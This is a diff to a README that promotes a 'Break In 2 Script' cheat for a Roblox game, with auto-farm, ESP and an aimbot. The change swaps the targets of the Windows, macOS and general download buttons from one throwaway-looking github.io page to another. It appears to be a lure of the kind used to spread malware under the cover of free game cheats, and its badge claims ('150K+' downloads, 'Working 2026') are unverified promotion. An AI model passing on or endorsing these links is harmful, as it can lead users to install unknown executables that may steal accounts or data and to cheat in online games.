@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Break In 2 Script](https://img.shields.io/badge/Download%20Break%20In%202%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download Break In 2 Script](https://img.shields.io/badge/Download%20Break%20In%202%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **Break In 2 Script** for Break In 2 — auto-farm, ESP, aimbo
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 </div>
 
